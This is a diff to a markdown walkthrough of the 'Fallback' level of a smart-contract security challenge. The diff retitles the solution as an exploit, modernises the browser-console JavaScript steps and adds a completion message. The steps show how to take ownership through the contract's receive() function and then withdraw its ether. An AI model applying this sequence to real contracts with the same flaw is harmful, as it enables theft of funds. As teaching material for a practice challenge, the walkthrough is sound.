@@ -71,7 +71,7 @@ contract Fallback {
 ```
 {% endcode %}
 
-### Solution
+### Exploit
 
 The exploit in this contract is in the `receive()` function as it changes the owner to _**any**_ `msg.sender` provided that the `msg.sender` has previously been added to the `contributions` mapping.
 
@@ -79,8 +79,8 @@ The exploit in this contract is in the `receive()` function as it changes the ow
 
 {% code title="Paste into Chrome JavaScript console" %}
 ```javascript
-contract.contribute({
-    value: 500000000000000, // 0.0005 ETH
+await contract.contribute({
+    value: toWei('0.0005'),
 })
 ```
 {% endcode %}
@@ -89,10 +89,10 @@ contract.contribute({
 
 {% code title="Paste into Chrome JavaScript console" %}
 ```javascript
-sendTransaction({
+await sendTransaction({
     to: contract.address,
     from: player,
-    value: 100000000000000 // 0.0001 ETH
+    value: toWei('0.0001')
 })
 ```
 {% endcode %}
@@ -101,11 +101,21 @@ sendTransaction({
 
 {% code title="Paste into Chrome JavaScript console" %}
 ```javascript
-contract.withdraw()
+await contract.withdraw()
 ```
 {% endcode %}
 
 4. Submit instance... 🥳
+
+### Completion Message
+
+{% hint style="info" %}
+You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.
+
+You've also learned about OpenZeppelin's Ownable contract, and how it can be used to restrict the usage of some methods to a privileged address.
+
+Move on to the next level when you're ready!
+{% endhint %}
 
 ### Notes
 
